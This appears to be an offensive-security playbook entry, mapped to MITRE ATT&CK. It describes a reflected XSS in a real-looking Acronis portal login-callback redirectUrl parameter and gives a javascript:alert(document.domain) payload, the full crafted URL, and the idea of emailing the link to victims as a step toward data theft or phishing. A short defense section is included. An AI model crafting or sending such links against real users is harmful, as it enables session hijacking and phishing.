---
tags:
  - xss
  - javascript-injection
  - payload-crafting
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/alert-document-domain]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: de29e5a1-998a-4c50-a50c-788af217dbdf
created_at: '2025-12-13T23:55:06.835Z'
updated_at: '2025-12-13T23:55:06.835Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Craft-Malicious-URL-with-JS-Payload

## Summary

This procedure crafts a malicious URL embedding a JavaScript payload in the redirectUrl parameter of the Acronis login callback endpoint, exploiting a reflected XSS vulnerability to execute code upon user login and redirection.

## Description

The Acronis learning portal's /portal/login-callback endpoint fails to sanitize the redirectUrl parameter, allowing javascript: protocol handlers to inject and execute arbitrary JS in the victim's browser context after authentication. This step focuses on basic payload injection to confirm execution, such as alerting the document domain. Prerequisites include knowledge of the target URL and ability to distribute the malicious link (e.g., via email). Expected outcomes: Script execution confirming the vuln, setting stage for data theft or phishing.

## Requirements

1. Access to a web browser for testing
2. Target login endpoint URL (https://portal.acronis.com/portal/login-callback)
3. Victim interaction via login

## Defense

Defensive measures and detection strategies:

- Sanitize redirect URLs by whitelisting allowed domains and stripping javascript: protocols
- Implement Content Security Policy (CSP) to block inline scripts
- Monitor for anomalous redirects or JS execution in logs

## Objectives

1. Verify XSS execution in browser context
2. Confirm domain access for further exploitation
3. Establish proof-of-concept for reporting

## Instructions

### Step 1: Prepare the Payload

**Context**: Create a simple JS payload to test execution without exfiltration.

**Command** ([[commands/alert-document-domain]]):

```javascript
javascript:alert(document.domain)
```

> This payload uses alert() to display the current domain, confirming JS runs in the portal's context. Expected output: Popup with 'portal.acronis.com' or similar.

### Step 2: Inject into URL and Test

**Context**: Append the payload to the endpoint and simulate login.

**Command** ([[commands/alert-document-domain]]):

Full URL:

```url
https://portal.acronis.com/portal/login-callback?redirectUrl=javascript:alert(document.domain)
```

> Navigate to the URL, complete login, and observe redirection. Success: Alert triggers post-login.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/alert-document-domain]]

## Tools Used


## Tags

- [[xss]]
- [[javascript-injection]]
